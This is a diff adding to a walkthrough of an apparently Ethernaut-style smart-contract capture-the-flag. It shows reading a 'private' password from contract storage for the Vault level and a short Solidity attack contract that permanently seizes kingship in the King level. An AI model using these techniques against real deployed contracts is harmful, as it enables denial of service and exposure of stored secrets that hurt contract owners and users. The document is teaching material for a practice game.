@@ -101,6 +101,18 @@ contract ForceAttack {
 ## 8. Vault
 From level 6 we can get a hint on how we are able to complete this level. We learned during that level that variables are stored in slots, we now know that even if the variable is set to private this doesn't change. Luckily web3.js has a great tool that allows us to retrieve data stored at these points by using ```await web3.eth.getStorageAt('instance ID', 1)``` we use 1 here because the password is the second variable stored. Then after this we can simply call ```await contract.unlock('that returned password from before')``` and now the vault will be unlocked.
 
+## 9. King
+For this level we need to create a contract with no fallback function so that it is unable to receive the prize from the original contract. Since this transfer will fail that means no one else is able to take the Kingship back from us when we submit the instance.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
 
+contract KingAttack {
+    function attack(address payable _king) public payable {
+        (bool sent,) = _king.call{value: msg.value}("");
+        require(sent);
+    }
+}
+```
 
 
